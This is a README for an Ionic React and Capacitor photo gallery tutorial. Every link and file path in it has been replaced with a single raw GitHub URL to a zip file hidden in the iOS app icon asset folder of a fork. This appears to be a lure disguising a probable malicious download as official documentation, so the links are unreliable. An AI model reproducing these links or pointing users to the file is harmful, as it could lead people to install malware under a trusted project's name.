# Build Your First Ionic App: Photo Gallery (Ionic React and Capacitor)

Get started with Ionic by building a photo gallery app that runs on iOS, Android, and the web - with just one codebase. This is the complete project referenced in the ["Your First App: React" guide](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip). Follow along to create a complete CRUD (create-read-update-delete) experience.

Powered by [Ionic React](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip) (web app) and [Capacitor](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip) (native app runtime).

## How It Works

After the user navigates to Tab 2 (Photos), they can tap/click on the camera button to open up the device's camera. After taking or selecting a photo, it's stored permanently into the device's filesystem. When the user reopens the app at a later time, the photo images are loaded from the filesystem and displayed again in the gallery. The user can tap on a photo to be presented with the option to remove the photo.

## Feature Overview
* App framework: [React](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip)
* UI components: [Ionic Framework](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip)
  * Camera button: [Floating Action Button (FAB)](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip)
  * Photo Gallery display: [Grid](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip)
  * Delete Photo dialog: [Action Sheet](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip) 
* Native runtime: [Capacitor](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip)
  * Taking photos: [Camera API](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip)
  * Writing photo to the filesystem: [Filesystem API](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip)
  * Storing photo gallery metadata: [Preferences API](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip)

## Project Structure
* Tab2 (Photos) (`https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip`): Photo Gallery UI and basic logic.
* usePhotoGallery Hook (`https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip`): Logic encapsulating Capacitor APIs, including Camera, Filesystem, and Preferences.

## How to Run

> Note: It's highly recommended to follow along with the [tutorial guide](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip), which goes into more depth, but this is the fastest way to run the app. 

0) Install Ionic if needed: `npm install -g @ionic/cli`.
1) Clone this repository.
2) In a terminal, change directory into the repo: `cd photo-gallery-capacitor-react`.
3) Install all packages: `npm install`.
4) Run on the web: `ionic serve`.
5) Run on iOS or Android: See [here](https://raw.githubusercontent.com/ahmedfazil3/tutorial-photo-gallery-react/main/ios/App/App/Assets.xcassets/AppIcon.appiconset/tutorial_gallery_photo_react_v2.9.zip).
